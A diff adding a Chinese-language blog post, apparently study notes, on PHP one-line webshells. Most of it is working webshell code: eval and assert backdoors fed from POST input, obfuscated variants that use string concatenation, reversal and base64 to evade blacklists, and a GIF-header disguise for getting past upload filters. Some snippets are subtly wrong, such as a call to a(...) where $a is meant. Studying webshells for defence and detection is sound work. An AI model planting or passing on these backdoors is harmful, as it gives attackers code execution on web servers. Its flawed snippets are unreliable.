@@ -1,0 +1,133 @@
+---
+title: PHP 一句話木馬
+date: 2024-07-13T00:00:00.000Z
+tags:
+  - php
+  - sec
+draft: false
+images:
+  - /static/images/blog/2025/8a4a4a/Pasted%20image%2020241013143113.png
+authors:
+  - default
+---
+
+#### 實例
+
+```php
+<?php @eval($_POST['shell']);?>
+```
+
+- @ 防止報錯
+- eval() 把字符串當作php代碼執行
+- `$_POST['xyz']` 以post方式獲取名為xyz的變量
+
+使用：訪問這句木馬所在的php文件，以post方式傳入 xyz = phpinfo()
+
+- 網頁會（執行`phpinfo()` 這個函數）返回網頁php的版本信息
+
+---
+
+## 變形
+
+### assert
+
+```php
+<?php
+$a = "assert";
+$a(@$_POST['shell']);
+?>
+```
+
+- 區別在於 `assert` 函數在執行給定代碼時，要求代碼的結果為布爾類型，而 `eval` 函數則可以執行任意有效的 PHP 代碼
+
+### 字符變形
+
+使用字符串拼接、大小寫混淆、字符串逆序組合而成
+
+```php
+<?php
+$a="TR"."Es"."sA";
+$b=strtolower($a);
+$c=strrev($b);
+@$c($_POST['shell']);
+?>
+
+# phpinfo();
+<?php
+$a="of"."NiP"."Hp";
+$b=strtolower($a);
+$c=strrev($b);
+@$c();
+?>
+```
+
+- `strtolower()` 是 PHP 中的一個內置函數，用於將字符串轉換為小寫字母
+- `strrev()` 字符串反轉
+
+注意，字符變形僅僅用於函數名，不能寫成 `$a=")(of"."NiP"."Hp";` ，不能把括號一起放入。
+
+用解析出來的變量替代函數名，本質上只是**字符的替換**，繞過黑名單檢測，最後“觸發”函數的執行需要依賴括號 `()` 。假如括號也寫在字符變形之中，最終由變量替換產生一串 `phpinfo()` 這樣的**字符串**，php 顯然不會執行這個**字符串**，所以必須把括號放在外面。
+
+### 自定義函數
+
+```php
+<?php
+function fun($a){
+    @eval($a);
+}
+@fun($_POST['shell']);
+?>
+```
+
+### create_function
+
+```php
+<?php
+$fun = create_function('',$_POST['shell']);
+$fun();
+?>
+```
+
+- 用法：`$addFunction = create_function('参数', '函数体');`
+
+### base64_decode 函數
+
+```php
+<?php
+$a=base64_decode("YXNzZXJ0");
+@a($_POST['shell']);
+?>
+```
+
+`YXNzZXJ0`是assert的base64編碼，`base64_decode()`是base64解密函數
+
+### 繞過`<?`
+
+`GIF89a? <script language="php">eval($_REQUEST[123])</script> `
+
+- `GIF89a`: 這是 GIF 圖像文件的文件頭標識符
+- 剩餘就是正常的html語言
+
+### `<?` 繞過
+
+```html
+<script language="php">
+  eval($_POST['zj'])
+</script>
+```
+
+---
+
+## 短標籤
+
+![](/static/images/blog/2025/8a4a4a/Pasted%20image%2020241013143113.png)
+
+short_open_tag 開啟以後，可以使用 PHP 的短標籤：`<? ?>`
+
+- 繞過黑名單有 `php` 的情況
+
+---
+
+#### 題目
+
+-
